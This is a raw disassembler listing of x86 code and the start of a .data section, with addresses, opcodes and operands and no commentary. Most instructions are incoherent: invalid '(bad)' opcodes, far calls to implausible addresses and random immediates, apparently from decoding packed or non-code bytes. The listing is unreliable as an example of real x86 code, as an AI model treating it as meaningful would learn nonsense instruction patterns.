  41c6e3:	jns    0x41c678
  41c6e5:	repz rol DWORD PTR [edx],0x86
  41c6e9:	inc    ebp
  41c6ea:	xchg   esp,eax
  41c6eb:	jb     0x41c6c5
  41c6ed:	adc    BYTE PTR [ecx],ah
  41c6ef:	punpcklbw mm0,DWORD PTR [ebx]
  41c6f2:	jbe    0x41c6fd
  41c6f4:	jne    0x41c71f
  41c6f6:	ja     0x41c713
  41c6f8:	xor    esi,DWORD PTR [eax]
  41c6fa:	jnp    0x41c6df
  41c6fc:	or     bl,ch
  41c6fe:	cmc    
  41c6ff:	adc    edi,DWORD PTR [ebp-0x5a]
  41c702:	out    dx,eax
  41c703:	jmp    0x175eda10
  41c708:	test   esp,esp
  41c70a:	xchg   esi,eax
  41c70b:	imul   edi
  41c70d:	jmp    0xfcd77d9c
  41c712:	mov    bl,0x24
  41c714:	sbb    edx,DWORD PTR [edi+0x6c5182b]
  41c71a:	push   es
  41c71b:	jae    0x41c757
  41c71d:	clc    
  41c71e:	rcr    BYTE PTR [esi+0x46f9cab8],1
  41c724:	jae    0x41c787
  41c726:	jnp    0x41c701
  41c728:	mov    ebx,?
  41c72a:	int3   
  41c72b:	mov    esi,0x36f52bc4
  41c730:	loope  0x41c6e9
  41c732:	add    BYTE PTR [esi-0x48],dl
  41c735:	add    ebp,DWORD PTR [edi+0x5e]
  41c738:	jb     0x41c706
  41c73a:	cmp    eax,DWORD PTR [edx-0x5c892a2e]
  41c740:	jns    0x41c722
  41c742:	sub    esp,DWORD PTR [edx]
  41c744:	scas   al,BYTE PTR es:[edi]
  41c745:	fld    QWORD PTR [ecx-0x54c86958]
  41c74b:	xchg   edi,eax
  41c74c:	pop    eax
  41c74d:	sbb    BYTE PTR [edi],0xc7
  41c750:	fmulp  st(4),st
  41c752:	and    ecx,DWORD PTR [ebp+0x23c5aaf9]
  41c758:	push   esi
  41c759:	loope  0x41c7bc
  41c75b:	mov    dl,ch
  41c75d:	(bad)  
  41c75e:	iret   
  41c75f:	pop    ebx
  41c760:	adc    esi,DWORD PTR [ecx+0x519b5ff0]
  41c766:	jbe    0x41c777
  41c768:	pop    es
  41c769:	call   0x6a62:0x795b321
  41c770:	fdiv   st(0),st
  41c772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c773:	das    
  41c774:	or     bl,ah
  41c776:	inc    ebp
  41c777:	cs (bad) 
  41c779:	inc    edx
  41c77a:	inc    eax
  41c77b:	sahf   
  41c77c:	push   cs
  41c77d:	push   eax
  41c77e:	mov    cl,0xaf
  41c780:	(bad)  
  41c781:	push   esi
  41c782:	(bad)  
  41c784:	sub    edx,eax
  41c786:	mov    bl,dh
  41c788:	push   ss
  41c789:	arpl   WORD PTR [ebx],bx
  41c78b:	in     al,dx
  41c78c:	push   eax
  41c78d:	pop    esi
  41c78e:	pop    esi
  41c78f:	cmp    al,0xa2
  41c791:	mov    esp,0xb0ff40ed
  41c796:	std    
  41c797:	aaa    
  41c798:	mov    ch,0x63
  41c79a:	cli    
  41c79b:	fcmovne st,st(6)
  41c79d:	jae    0x41c79a
  41c79f:	data16 mov dl,0xf2
  41c7a2:	jge    0x41c7d8
  41c7a4:	xchg   edi,eax
  41c7a5:	(bad)  
  41c7a6:	xor    eax,0xc2c89be0
  41c7ab:	fnstsw WORD PTR [edx]
  41c7ad:	fisub  DWORD PTR [eax]
  41c7af:	ret    0xdad5
  41c7b2:	pop    es
  41c7b3:	mov    fs,WORD PTR [ebx]
  41c7b5:	fwait
  41c7b6:	mov    ah,0x70
  41c7b8:	call   0xdb27:0x2ac2553d
  41c7bf:	push   0xffffffe0
  41c7c1:	sub    eax,0x517e9a4d
  41c7c6:	dec    esi
  41c7c7:	or     bh,BYTE PTR [eax-0x4bdc8419]
  41c7cd:	loope  0x41c797
  41c7cf:	mov    dl,0xdc
  41c7d1:	ss mov esi,0xf86cd856
  41c7d7:	push   esi
  41c7d8:	retf   
  41c7d9:	mov    ?,ebp
  41c7db:	gs ds dec edx
  41c7de:	iret   
  41c7df:	cmp    esi,esp
  41c7e1:	jae    0x41c7a8
  41c7e3:	xchg   DWORD PTR [ecx],edi
  41c7e5:	stc    
  41c7e6:	mov    ch,0x36
  41c7e8:	jno    0x41c833
  41c7ea:	jb     0x41c834
  41c7ec:	iret   
  41c7ed:	mov    WORD PTR ds:0x534e0b84,cs
  41c7f3:	cmc    
  41c7f4:	jl     0x41c782
  41c7f6:	inc    edx
  41c7f7:	pusha  
  41c7f8:	dec    edi
  41c7f9:	add    eax,0xd25246ce
  41c7fe:	lea    edx,[ebp-0x2a]
  41c801:	lods   eax,DWORD PTR ds:[esi]
  41c802:	inc    eax
  41c803:	xchg   esi,eax
  41c804:	mul    DWORD PTR ds:0xda586def
  41c80a:	mov    al,BYTE PTR [edi]
  41c80c:	ret    0xc7a4
  41c80f:	add    eax,0x653f96e4
  41c814:	out    0x6c,al
  41c816:	cdq    
  41c817:	shl    dh,1
  41c819:	cmp    DWORD PTR [eax],0xffffff8b
  41c81c:	push   0xfb3d6ab3
  41c821:	in     al,0x68
  41c823:	in     eax,dx
  41c824:	fisttp QWORD PTR [edx+eiz*8+0x60a59acf]
  41c82b:	(bad)  
  41c82c:	dec    esp
  41c82d:	cmp    BYTE PTR [eax+0x2b],bh
  41c830:	mul    DWORD PTR ds:0x14597cfb
  41c836:	jp     0x41c847
  41c838:	test   DWORD PTR [ebx-0x21acbcc7],esp
  41c83e:	(bad)  
  41c83f:	pop    esi
  41c840:	ins    DWORD PTR es:[edi],dx
  41c841:	mov    esi,0xf438316b
  41c846:	dec    edx
  41c847:	cmc    
  41c848:	and    edx,DWORD PTR [eax-0x72]
  41c84b:	jg     0x41c883
  41c84d:	adc    BYTE PTR [ebx+esi*1+0x6f],bl
  41c851:	or     eax,0xb5fd013b
  41c856:	cwde   
  41c857:	cmc    
  41c858:	mov    esp,DWORD PTR [edx]
  41c85a:	push   edi
  41c85b:	jg     0x41c859
  41c85d:	(bad)  [ecx+0x2fbca2cb]
  41c863:	addr16 ja 0x41c815
  41c866:	jo     0x41c8d5
  41c868:	stos   DWORD PTR es:[edi],eax
  41c869:	pop    edx
  41c86a:	(bad)  
  41c86b:	int    0x3c
  41c86d:	cli    
  41c86e:	scas   eax,DWORD PTR es:[edi]
  41c86f:	mov    BYTE PTR [ecx+0x43380b29],bl
  41c875:	pusha  
  41c876:	push   eax
  41c877:	sub    ebx,DWORD PTR [edx-0x3f]
  41c87a:	retf   0xf2df
  41c87d:	inc    esp
  41c87e:	jmp    0x41c84a
  41c880:	ja     0x41c863
  41c882:	scas   eax,DWORD PTR es:[edi]
  41c883:	(bad)  
  41c884:	test   al,0x22
  41c886:	std    
  41c887:	add    ch,BYTE PTR [edx-0x19]
  41c88a:	lahf   
  41c88b:	rcr    BYTE PTR ds:0xa8093b9b,cl
  41c891:	add    eax,0xad9efe79
  41c896:	mov    eax,ds:0x198ad2db
  41c89b:	push   cs
  41c89c:	pop    esp
  41c89d:	cdq    
  41c89e:	cmp    BYTE PTR [ecx+0x178a3640],dl
  41c8a4:	sar    eax,1
  41c8a6:	retf   
  41c8a7:	jo     0x41c922
  41c8a9:	mov    ch,0x52
  41c8ab:	daa    
  41c8ac:	mul    BYTE PTR [esi+edi*2-0x430fb0cf]
  41c8b3:	add    eax,0x93606c8c
  41c8b8:	arpl   cx,sp
  41c8ba:	pop    edx
  41c8bb:	xchg   esp,eax
  41c8bc:	sub    BYTE PTR [ebx],cl
  41c8be:	iret   
  41c8bf:	jbe    0x41c91e
  41c8c1:	test   al,0x72
  41c8c3:	loope  0x41c8db
  41c8c5:	fiadd  WORD PTR [esi]
  41c8c7:	imul   edx,DWORD PTR [ebx-0x322886f7],0xf1acb913
  41c8d1:	inc    esp
  41c8d2:	or     al,0xc7
  41c8d4:	pop    ecx
  41c8d5:	ins    BYTE PTR es:[edi],dx
  41c8d6:	les    edx,FWORD PTR [ecx+ebp*1]
  41c8d9:	and    ah,BYTE PTR [ecx-0x75ca40c4]
  41c8df:	fisttp WORD PTR [ecx]
  41c8e1:	push   esi
  41c8e2:	sbb    esp,edi
  41c8e4:	scas   eax,DWORD PTR es:[edi]
  41c8e5:	add    eax,0xdd47fd07
  41c8ea:	stc    
  41c8eb:	inc    esi
  41c8ec:	and    eax,0x3434aa6
  41c8f1:	sbb    al,0x1a
  41c8f3:	dec    ebx
  41c8f4:	xor    edx,edx
  41c8f6:	add    DWORD PTR [ebp-0xc],ebx
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	lock jmp 0xf75a21f1
  41c915:	jg     0x41c98f
  41c917:	adc    BYTE PTR [esi+0x78],bh
  41c91a:	js     0x41c983
  41c91c:	test   DWORD PTR es:[ebx+0x2e],ebp
  41c920:	mov    esi,0x7025cd99
  41c925:	pop    ss
  41c926:	scas   al,BYTE PTR es:[edi]
  41c927:	or     al,bl
  41c929:	xchg   esp,eax
  41c92a:	popa   
  41c92b:	pop    ds
  41c92c:	sahf   
  41c92d:	adc    edx,DWORD PTR [ecx]
  41c92f:	adc    al,ah
  41c931:	jnp    0x41c8ba
  41c933:	sbb    bh,bh
  41c935:	ds inc ebp
  41c937:	cdq    
  41c938:	xlat   BYTE PTR ds:[ebx]
  41c939:	pop    edx
  41c93a:	add    ah,BYTE PTR [esi+0x73b46dbc]
  41c940:	xor    dh,0x2b
  41c943:	xchg   ecx,eax
  41c944:	shl    BYTE PTR [eax-0x77],0xd
  41c948:	and    al,0xbf
  41c94a:	jo     0x41c985
  41c94c:	jp     0x41c969
  41c94e:	cdq    
  41c94f:	clc    
  41c950:	stos   DWORD PTR es:[edi],eax
  41c951:	in     al,dx
  41c952:	mov    bh,0x61
  41c954:	and    ecx,0x95a7a2e0
  41c95a:	in     al,0x4b
  41c95c:	out    dx,eax
  41c95d:	inc    edx
  41c95e:	sbb    DWORD PTR [ebp-0x728c00fa],ebx
  41c964:	inc    ebx
  41c965:	aam    0xad
  41c967:	outs   dx,DWORD PTR ds:[esi]
  41c968:	mov    esp,0xd1d97554
  41c96d:	data16 clc 
  41c96f:	xchg   BYTE PTR [edi],ch
  41c971:	adc    ah,BYTE PTR [edx+0x27]
  41c974:	jb     0x41c9b9
  41c976:	fild   QWORD PTR [ebp+0x57205de5]
  41c97c:	push   es
  41c97d:	xchg   edi,eax
  41c97e:	iret   
  41c97f:	aad    0x7b
  41c981:	imul   BYTE PTR [ecx]
  41c983:	add    DWORD PTR [ebx+0x3171d623],eax
  41c989:	mov    ah,0xbc
  41c98b:	add    DWORD PTR [ecx+0x54],0x40a74b5
  41c992:	cmc    
  41c993:	adc    ebx,DWORD PTR [ebp+0x2]
  41c996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c997:	adc    DWORD PTR [esi+eax*8],0x32
  41c99b:	adc    ah,BYTE PTR [eax-0xc27216e]
  41c9a1:	cmc    
  41c9a2:	cmp    DWORD PTR [ebx-0x2e],0x732ccd71
  41c9a9:	and    BYTE PTR [eax],al
  41c9ab:	jbe    0x41c9db
  41c9ad:	ins    BYTE PTR es:[edi],dx
  41c9ae:	pop    ecx
  41c9af:	test   DWORD PTR [edx+eiz*2+0x118b17e5],edx
  41c9b6:	adc    BYTE PTR [eax-0x3c6e6883],cl
  41c9bc:	(bad)  
  41c9bd:	shl    ebp,1
  41c9bf:	cmp    dl,dh
  41c9c1:	or     eax,esp
  41c9c3:	xchg   ecx,eax
  41c9c4:	xchg   edx,eax
  41c9c5:	push   esi
  41c9c6:	pusha  
  41c9c7:	sar    edi,cl
  41c9c9:	clc    
  41c9ca:	jb     0x41c97b
  41c9cc:	loopne 0x41ca12
  41c9ce:	push   es
  41c9cf:	dec    ecx
  41c9d0:	cmc    
  41c9d1:	fisttp DWORD PTR [ebx]
  41c9d3:	(bad)  
  41c9d4:	jnp    0x41c971
  41c9d6:	ins    BYTE PTR es:[edi],dx
  41c9d7:	fxch   st(5)
  41c9d9:	push   ebp
  41c9da:	xor    edx,DWORD PTR [eax+0xc]
  41c9dd:	sub    BYTE PTR [ecx],0xf5
  41c9e0:	inc    ecx
  41c9e1:	nop
  41c9e2:	add    DWORD PTR [ecx],0xa5339642
  41c9e8:	scas   eax,DWORD PTR es:[edi]
  41c9e9:	out    dx,eax
  41c9ea:	addr16 sub ecx,edi
  41c9ed:	js     0x41ca64
  41c9ef:	hlt    
  41c9f0:	loop   0x41ca6e
  41c9f2:	fist   DWORD PTR ds:0x83c842b7
  41c9f8:	xchg   ebp,eax
  41c9f9:	xlat   BYTE PTR ds:[ebx]
  41c9fa:	cdq    
  41c9fb:	leave  
  41c9fc:	rcl    cl,1
  41c9fe:	jp     0x41c99c
  41ca00:	mov    esp,edi
  41ca02:	inc    edi
  41ca03:	leave  
  41ca04:	mov    ?,WORD PTR [eax+0x5e58b49a]
  41ca0a:	push   cs
  41ca0b:	arpl   WORD PTR [ecx+0x16d2cc3],dx
  41ca11:	int3   
  41ca12:	cs popf 
  41ca14:	and    DWORD PTR [ebx],eax
  41ca16:	out    0xbd,eax
  41ca18:	dec    edx
  41ca19:	jne    0x41c9eb
  41ca1b:	cmp    DWORD PTR [edi+esi*4-0x56],edi
  41ca1f:	dec    ebp
  41ca20:	repnz pop esp
  41ca22:	sub    ah,BYTE PTR [eax+0x6d]
  41ca25:	push   eax
  41ca26:	mov    ebp,0x2002a9a1
  41ca2b:	call   0xaa07ce4f
  41ca30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca31:	or     DWORD PTR [ecx+0x2c],edx
  41ca34:	and    bl,BYTE PTR [edi-0x49]
  41ca37:	dec    ecx
  41ca38:	gs jnp 0x41ca4b
  41ca3b:	pop    esi
  41ca3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca3d:	xchg   edx,eax
  41ca3e:	or     dl,ch
  41ca40:	xlat   BYTE PTR ds:[ebx]
  41ca41:	or     cl,al
  41ca43:	and    BYTE PTR [esp+ebp*8],0xe5
  41ca47:	inc    ebx
  41ca48:	or     edx,eax
  41ca4a:	push   cs
  41ca4b:	jnp    0x41c9e2
  41ca4d:	xchg   edi,eax
  41ca4e:	pop    ss
  41ca4f:	sub    ah,ch
  41ca51:	mov    ds:0x4ab03a02,al
  41ca56:	fst    DWORD PTR [ebx*2-0x6edff911]
  41ca5d:	fcmovu st,st(0)
  41ca5f:	xchg   edx,eax
  41ca60:	add    al,0x2
  41ca62:	xchg   edx,eax
  41ca63:	cld    
  41ca64:	adc    ah,BYTE PTR [ecx+0x69d2d197]
  41ca6a:	cld    
  41ca6b:	sub    BYTE PTR [edx-0x39],cl
  41ca6e:	pop    ds
  41ca6f:	cmp    esi,DWORD PTR [eax]
  41ca71:	dec    eax
  41ca72:	xor    esp,DWORD PTR [ebp-0x53]
  41ca75:	and    bl,BYTE PTR [ebx+0x565e6627]
  41ca7b:	cdq    
  41ca7c:	jnp    0x41ca68
  41ca7e:	shl    DWORD PTR [ebx],1
  41ca80:	hlt    
  41ca81:	out    0x8f,eax
  41ca83:	sbb    DWORD PTR [eax-0x64],esi
  41ca86:	frstor [ebp+0x1c]
  41ca89:	add    ebx,DWORD PTR [ebp+0x5c]
  41ca8c:	sbb    al,0x7b
  41ca8e:	cmp    cl,BYTE PTR [ebx-0x31]
  41ca91:	aam    0x32
  41ca93:	xchg   edx,eax
  41ca94:	out    0x5d,al
  41ca96:	add    BYTE PTR [ebx-0xc773560],bl
  41ca9c:	(bad)  
  41ca9d:	pop    ebx
  41ca9e:	adc    ecx,DWORD PTR [ecx+0x37]
  41caa1:	cmc    
  41caa2:	ficom  WORD PTR [ebp-0x3]
  41caa5:	xor    esp,DWORD PTR [ecx+0x73]
  41caa8:	inc    esp
  41caa9:	add    al,ah
  41caab:	pop    es
  41caac:	jo     0x41cb29
  41caae:	(bad)  
  41caaf:	xchg   ebp,eax
  41cab0:	clc    
  41cab1:	out    0xb4,eax
  41cab3:	xor    al,BYTE PTR [ecx+ebp*1-0x3f43a210]
  41caba:	pop    ecx
  41cabb:	js     0x41ca68
  41cabd:	mov    cl,cl
  41cabf:	mov    DWORD PTR [ebx],esp
  41cac1:	mov    dl,0xac
  41cac3:	add    BYTE PTR [ecx-0x625d2322],dl
  41cac9:	inc    edx
  41caca:	mov    ch,0xdf
  41cacc:	sbb    eax,0x6d5ea49e
  41cad1:	(bad)  
  41cad2:	fsubr  DWORD PTR [edi]
  41cad4:	mov    eax,ds
  41cad6:	xchg   esi,eax
  41cad7:	jae    0x41caa6
  41cad9:	int    0x6f
  41cadb:	retf   
  41cadc:	mov    WORD PTR [esi-0x123c7dd4],ds
  41cae2:	jae    0x41cb0e
  41cae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cae5:	cli    
  41cae6:	stc    
  41cae7:	xchg   ebx,eax
  41cae8:	jo     0x41cb00
  41caea:	or     eax,0x721a54eb
  41caef:	arpl   di,cx
  41caf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caf2:	jmp    0x87cfebf2
  41caf7:	mov    al,0xc2
  41caf9:	and    eax,0x721c062a
  41cafe:	ds and ebp,ebp
  41cb01:	dec    edi
  41cb02:	pop    eax
  41cb03:	push   ebx
  41cb04:	push   eax
  41cb05:	fisubr WORD PTR [eax+0x4a]
  41cb08:	fild   WORD PTR [esi+0x186536c1]
  41cb0e:	jo     0x41cb57
  41cb10:	jp     0x41cb42
  41cb12:	inc    esi
  41cb13:	jg     0x41caa1
  41cb15:	cmc    
  41cb16:	cmp    ebx,esi
  41cb18:	sub    BYTE PTR [ebx-0x2f],0x81
  41cb1c:	fdivr  DWORD PTR [eax-0x4fe37d7a]
  41cb22:	jbe    0x41caa8
  41cb24:	and    BYTE PTR [esi+0x5ee9ffde],bl
  41cb2a:	into   
  41cb2b:	pushf  
  41cb2c:	adc    DWORD PTR ds:0xe09e881f,0x30e95e9d
  41cb36:	add    al,BYTE PTR [eax]
  41cb38:	add    dh,cl
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0xbf4a6037
  41cb47:	pop    ds
  41cb48:	or     eax,0x787ff530
  41cb4d:	adc    BYTE PTR [esi+0x78],bh
  41cb50:	js     0x41cadb
  41cb52:	lods   al,BYTE PTR ds:[esi]
  41cb53:	scas   al,BYTE PTR es:[edi]
  41cb54:	int    0x47
  41cb56:	int    0x48
  41cb58:	pop    ecx
  41cb59:	adc    BYTE PTR [ebx+ecx*1-0x4d],0x4c
  41cb5e:	push   0xfffffffc
  41cb60:	xor    bl,bh
  41cb62:	dec    edx
  41cb63:	clc    
  41cb64:	inc    esi
  41cb65:	dec    eax
  41cb66:	inc    ebx
  41cb67:	sbb    ebx,0x4b
  41cb6a:	fst    st(3)
  41cb6c:	sub    ah,BYTE PTR [ebx-0x56]
  41cb6f:	push   cs
  41cb70:	add    eax,0xac2b1d85
  41cb75:	dec    ecx
  41cb76:	or     BYTE PTR [edx+ebx*8],al
  41cb79:	std    
  41cb7a:	xor    BYTE PTR [ebx+0x30],0x54
  41cb7e:	sbb    eax,0xd0a36c81
  41cb83:	mov    bh,0x70
  41cb85:	jl     0x41cbae
  41cb87:	jbe    0x41cbbf
  41cb89:	sub    al,BYTE PTR [eax]
  41cb8b:	jns    0x41cbe9
  41cb8d:	(bad)  
  41cb8e:	mov    dh,0x3e
  41cb90:	push   ss
  41cb91:	sub    al,0x9e
  41cb93:	inc    ebx
  41cb94:	cwde   
  41cb95:	push   ebx
  41cb96:	and    edi,DWORD PTR [edi-0xad2800f]
  41cb9c:	loope  0x41cb66
  41cb9e:	push   esp
  41cb9f:	jb     0x41cbbf
  41cba1:	out    0x16,al
  41cba3:	xor    eax,0x72511c97
  41cba8:	aam    0x5
  41cbaa:	shr    DWORD PTR [eax],1
  41cbac:	add    eax,0xbff08e5
  41cbb1:	retf   0xb69
  41cbb4:	cs stos BYTE PTR es:[edi],al
  41cbb6:	data16 sti 
  41cbb8:	lods   al,BYTE PTR ds:[esi]
  41cbb9:	fsubr  st,st(2)
  41cbbb:	jno    0x41cbad
  41cbbd:	pop    eax
  41cbbe:	ret    
  41cbbf:	xchg   esi,eax
  41cbc0:	pop    eax
  41cbc1:	ret    
  41cbc2:	int3   
  41cbc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbc4:	push   ds
  41cbc5:	mov    cl,0xb6
  41cbc7:	dec    esi
  41cbc8:	js     0x41cc17
  41cbca:	lds    ebx,FWORD PTR [edi+0xa]
  41cbcd:	fwait
  41cbce:	mov    esp,0x6ffc9364
  41cbd3:	jnp    0x41cc54
  41cbd5:	sub    DWORD PTR [eax],ecx
  41cbd7:	clc    
  41cbd8:	in     eax,0x40
  41cbda:	jp     0x41cbf8
  41cbdc:	dec    ebp
  41cbdd:	xor    al,0x8
  41cbdf:	adc    ebp,0xcded47b5
  41cbe5:	cmp    DWORD PTR [ecx+edx*1+0x13],ecx
  41cbe9:	ss jg  0x41cb8f
  41cbec:	fadd   QWORD PTR [ebx]
  41cbee:	or     bh,cl
  41cbf0:	mov    ebx,0xbec591d4
  41cbf5:	out    0x9f,eax
  41cbf7:	xor    DWORD PTR [esi],0x7a
  41cbfa:	iret   
  41cbfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbfc:	xor    DWORD PTR ds:0x8271f8ba,ebp
  41cc02:	push   edi
  41cc03:	cmp    DWORD PTR ds:0xee6d2b0,ebx
  41cc09:	xchg   esi,eax
  41cc0a:	xlat   BYTE PTR ds:[ebx]
  41cc0b:	pop    ss
  41cc0c:	push   ecx
  41cc0d:	add    al,0x9e
  41cc0f:	pop    ds
  41cc10:	ds mov cl,bl
  41cc13:	lahf   
  41cc14:	repz mov bh,0x4
  41cc18:	sub    DWORD PTR ds:0x4fb75e99,ebp
  41cc1e:	push   edx
  41cc1f:	add    al,dl
  41cc21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc22:	mov    ?,WORD PTR [eax+0x38c7853e]
  41cc28:	loop   0x41cbf2
  41cc2a:	mov    ds,edx
  41cc2c:	int    0x69
  41cc2e:	gs call 0xc1b4:0x658d3891
  41cc36:	and    DWORD PTR [edx-0x34],0x54
  41cc3a:	repnz cmp dh,dl
  41cc3d:	outs   dx,BYTE PTR ds:[esi]
  41cc3e:	stos   DWORD PTR es:[edi],eax
  41cc3f:	pop    ds
  41cc40:	jno    0x41cc0c
  41cc42:	out    0xf4,eax
  41cc44:	jp     0x41cc67
  41cc46:	and    al,0x14
  41cc48:	out    dx,eax
  41cc49:	(bad)  
  41cc4b:	idiv   BYTE PTR [esi-0x33]
  41cc4e:	inc    edi
  41cc4f:	cmp    dh,dh
  41cc51:	pop    esp
  41cc52:	(bad)  
  41cc53:	aas    
  41cc54:	mov    fs,WORD PTR [eax-0x14]
  41cc57:	mov    ds,WORD PTR [edi-0x6073eaf9]
  41cc5d:	in     eax,dx
  41cc5e:	cmp    esp,edi
  41cc60:	dec    edx
  41cc61:	in     eax,0xb2
  41cc63:	mov    edx,0x3b43607d
  41cc68:	sub    dl,BYTE PTR [eax]
  41cc6a:	leave  
  41cc6b:	sbb    ebp,esi
  41cc6d:	jge    0x41cc49
  41cc6f:	and    dl,BYTE PTR [eax+ebx*4+0x51]
  41cc73:	call   0x8c0b:0x9e41a2ec
  41cc7a:	pop    ds
  41cc7b:	data16 stc 
  41cc7d:	rcr    BYTE PTR [esi-0x3c],cl
  41cc80:	stos   BYTE PTR es:[edi],al
  41cc81:	outs   dx,BYTE PTR ds:[esi]
  41cc82:	cld    
  41cc83:	out    dx,eax
  41cc84:	inc    esp
  41cc85:	pop    ebx
  41cc87:	and    al,0xda
  41cc89:	sub    BYTE PTR [edx-0x2dc2d6f1],al
  41cc8f:	or     ah,BYTE PTR [ebp-0x11]
  41cc92:	jno    0x41ccfa
  41cc94:	push   ebx
  41cc95:	cwde   
  41cc96:	dec    eax
  41cc97:	sub    ah,cl
  41cc99:	dec    ebp
  41cc9a:	adc    ch,dh
  41cc9c:	pop    edi
  41cc9d:	cs pop eax
  41cc9f:	dec    esp
  41cca0:	enter  0xe2b9,0x48
  41cca4:	push   esp
  41cca5:	xchg   edi,eax
  41cca6:	push   ecx
  41cca7:	xor    esi,DWORD PTR [esi]
  41cca9:	sub    ebp,esp
  41ccab:	push   0x12
  41ccad:	dec    ebx
  41ccae:	push   edi
  41ccaf:	daa    
  41ccb0:	add    al,BYTE PTR [eax+0x18]
  41ccb3:	cmp    cl,0x6d
  41ccb6:	repnz neg BYTE PTR [edi]
  41ccb9:	ds push 0x6985bfb9
  41ccbf:	adc    eax,0x98c4e36a
  41ccc4:	nop
  41ccc5:	or     BYTE PTR fs:[ebx+esi*2+0x1bc49c8f],0x4b
  41ccce:	lods   eax,DWORD PTR ds:[esi]
  41cccf:	daa    
  41ccd0:	stos   BYTE PTR es:[edi],al
  41ccd1:	or     cl,ch
  41ccd3:	call   0xb73e:0x1b82b199
  41ccda:	inc    ebp
  41ccdb:	cli    
  41ccdc:	fcomi  st,st(1)
  41ccde:	mov    cl,0xb9
  41cce0:	xchg   BYTE PTR [edx],dh
  41cce2:	sti    
  41cce3:	pop    esp
  41cce4:	jle    0x41cccc
  41cce6:	mov    bl,0x5
  41cce8:	enter  0x2af6,0x66
  41ccec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cced:	adc    BYTE PTR ds:0x1aca1d4c,cl
  41ccf3:	bound  ebx,QWORD PTR ds:0x5c280d3c
  41ccf9:	push   0x3c
  41ccfb:	repz inc edx
  41ccfd:	jns    0x41cc88
  41ccff:	jb     0x41ccc3
  41cd01:	add    BYTE PTR [eax-0x6b],ah
  41cd04:	fnstsw WORD PTR [edx]
  41cd06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd07:	push   edx
  41cd08:	pop    edi
  41cd09:	adc    al,0xc1
  41cd0b:	popa   
  41cd0c:	in     al,dx
  41cd0d:	mov    esi,0xdd60537b
  41cd12:	jne    0x41ccd1
  41cd14:	xchg   edx,eax
  41cd15:	pop    ebp
  41cd16:	lea    eax,[edi-0x4b]
  41cd19:	add    esp,DWORD PTR [edi-0x19]
  41cd1c:	hlt    
  41cd1d:	in     al,0xed
  41cd1f:	pop    ss
  41cd20:	ds dec eax
  41cd22:	aam    0xaf
  41cd24:	mov    esi,0x1c9ac073
  41cd29:	sub    eax,DWORD PTR [edx-0x2aa52545]
  41cd2f:	aaa    
  41cd30:	out    dx,al
  41cd31:	add    ah,BYTE PTR [edx]
  41cd33:	test   BYTE PTR [edi-0xf12b186],dh
  41cd39:	and    eax,DWORD PTR [esi-0x49]
  41cd3c:	and    ch,dh
  41cd3e:	or     eax,0xe0a5629f
  41cd43:	push   ecx
  41cd44:	cwde   
  41cd45:	pop    ds
  41cd46:	jbe    0x41cd7e
  41cd48:	in     al,0x2a
  41cd4a:	sbb    al,0xa6
  41cd4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd4d:	sti    
  41cd4e:	cmp    ebx,DWORD PTR [edi]
  41cd50:	and    esp,ebx
  41cd52:	ror    BYTE PTR [ecx-0x100948ec],0xae
  41cd59:	mov    fs,WORD PTR [esi+0x97976ef]
  41cd5f:	in     al,0xe5
  41cd61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd62:	imul   ebx,esp,0xffffffaa
  41cd65:	das    
  41cd66:	mov    BYTE PTR [ecx+0x6a],bl
  41cd69:	pop    ebx
  41cd6a:	leave  
  41cd6b:	ret    0x10

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
